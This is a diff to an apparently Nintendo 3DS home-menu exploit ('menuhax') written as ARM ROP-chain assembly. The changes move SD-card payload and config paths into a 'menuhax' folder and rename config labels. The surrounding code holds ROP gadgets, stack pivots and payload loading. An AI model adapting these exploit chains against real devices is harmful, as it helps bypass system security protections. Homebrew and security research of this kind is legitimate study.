@@ -322,7 +322,7 @@ IFile_ctx:
 
 #ifndef ENABLE_LOADROPBIN
 sdfile_path:
-.string16 "sd:/menuhax_payload.bin"
+.string16 "sd:/menuhax/menuhax_payload.bin"
 .align 2
 #else
 sdfile_ropbin_path:
@@ -332,21 +332,21 @@ sdfile_ropbin_path:
 #endif
 
 #ifdef LOADSDCFG_PADCHECK
-sdfile_padcfg_path:
-.string16 "sd:/menuhax_padcfg.bin"
+sdfile_cfg_path:
+.string16 "sd:/menuhax/menuhax_cfg.bin"
 .align 2
 #endif
 
 #ifdef ENABLE_IMAGEDISPLAY
 #ifdef ENABLE_IMAGEDISPLAY_SD
 sdfile_imagedisplay_path:
-.string16 "sd:/menuhax_imagedisplay.bin"
+.string16 "sd:/menuhax/menuhax_imagedisplay.bin"
 .align 2
 #endif
 #endif
 
 #ifdef LOADSDCFG_PADCHECK
-sdcfg_pad:
+menuhax_cfg:
 .space 0x10
 #endif
 
@@ -510,9 +510,9 @@ ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (0x0fff0000 + (filepath_
 @ Load the cfg file. Errors are ignored with file-reading.
 CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_padcfg_path - _start)), 1, 0
+CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 1, 0
 
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (sdcfg_pad - _start)), 0x10
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg - _start)), 0x10
 
 ROP_SETLR ROP_POPPC
 
@@ -523,10 +523,10 @@ ROP_SETLR ROP_POPPC
 
 .word IFile_Close
 
-rop_padcfg_cmpbegin1: @ Compare u32 filebuf+0 with 0x1, on match continue to the ROP following this, otherwise jump to rop_padcfg_cmpbegin2.
+rop_cfg_cmpbegin1: @ Compare u32 filebuf+0 with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin2.
 ROP_SETLR ROP_POPPC
 
-ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x1, (HEAPBUF + (rop_padcfg_cmpbegin2 - _start)), 0x0
+ROPMACRO_CMPDATA (HEAPBUF + (menuhax_cfg - _start)), 0x1, (HEAPBUF + (rop_cfg_cmpbegin2 - _start)), 0x0
 
 ROP_SETLR ROP_POPPC
 
@@ -534,17 +534,17 @@ ROP_SETLR ROP_POPPC
 .word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((sdcfg_pad+0x4) - _start)) @ r1
+.word (HEAPBUF + ((menuhax_cfg+0x4) - _start)) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x4 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
 
-@ This ROP chunk has finished, jump to rop_padcfg_end.
-ROPMACRO_STACKPIVOT (HEAPBUF + (rop_padcfg_end - _start)), ROP_POPPC
+@ This ROP chunk has finished, jump to rop_cfg_end.
+ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_end - _start)), ROP_POPPC
 
-rop_padcfg_cmpbegin2: @ Compare u32 filebuf+0 with 0x2, on match continue to the ROP following this, otherwise jump to rop_padcfg_end.
+rop_cfg_cmpbegin2: @ Compare u32 filebuf+0 with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_end.
 ROP_SETLR ROP_POPPC
 
-ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x2, (HEAPBUF + (rop_padcfg_end - _start)), 0x0
+ROPMACRO_CMPDATA (HEAPBUF + (menuhax_cfg - _start)), 0x2, (HEAPBUF + (rop_cfg_end - _start)), 0x0
 
 @ This type is the same as type1(minus the offset the PAD value is loaded from), except that it basically inverts the padcheck: on PAD match ret2menu, on mismatch continue ROP.
 
@@ -552,7 +552,7 @@ ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x2, (HEAPBUF + (rop_padcfg_e
 .word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((sdcfg_pad+0x8) - _start)) @ r1
+.word (HEAPBUF + ((menuhax_cfg+0x8) - _start)) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x8 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
 
@@ -580,7 +580,7 @@ ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x2, (HEAPBUF + (rop_padcfg_e
 
 .word ROP_STR_R1TOR0 @ Write the address of padcheck_finish to padcheck_sp_value.
 
-rop_padcfg_end:
+rop_cfg_end:
 #endif
 
 ROP_SETLR ROP_POPPC
